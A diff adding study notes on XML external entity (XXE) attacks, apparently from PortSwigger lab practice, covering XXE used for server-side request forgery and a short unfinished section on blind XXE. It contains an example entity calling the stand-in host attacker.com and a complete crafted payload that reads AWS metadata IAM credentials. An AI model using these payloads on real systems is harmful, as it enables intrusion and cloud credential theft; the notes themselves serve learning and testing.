@@ -33,3 +33,49 @@
   Once the crafted payload is sent to the server, the content of the file can be retrieved from the application's response.
 
   ![image](https://github.com/user-attachments/assets/ac82c5d3-06c8-41c5-a877-2a17d2bd9b7c)
+
+  ---
+
+  ### Exploiting XXE to perform SSRF
+
+  XXE Attack can potentially induce the server-side application to make HTTP request to any URL that the server can access.
+
+  To exploit such attack, we need to define an external XML entity that contains an URL that we want to target and use the defined entity within a data value which makes us be able to see response from target URL within the application's response.
+
+  Example XXE to perform SSRF attacks:
+
+  ```
+    <!DOCTYPE foo [<!ENTITY xss-ssrf SYSTEM "http://attacker.com "> ]>
+  ```
+
+  Performing XXE attack on the lab on portswinger, view the reference section on more details about the lab.
+
+  The following code is the crafted payload to retrieve the application's sensitive data by using above SSRF attack method mentioned.
+
+  ```
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [<!ENTITY xxe-ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ] >
+    <stockCheck>
+      <productId>
+        &xxe-ssrf;
+      </productId>
+      <storeId>
+        1
+      </storeId>
+    </stockCheck>
+  ```
+
+  This response for this payload retrieves teh sensitive contents of the application.
+
+  ![image](https://github.com/user-attachments/assets/08b1c780-06aa-45a5-90cb-2a7b16ec607a)
+
+---
+  ### Blind XXE Injection
+
+  Blind injection occurs when there is no response from application.
+  Therefore direct retrieval of files from server-side is not possible.
+  
+  Use out of band techniques to exploit such vulnerabilities and extract data , also trigger parser error messages to disclose      sensitive data.
+
+  
+  
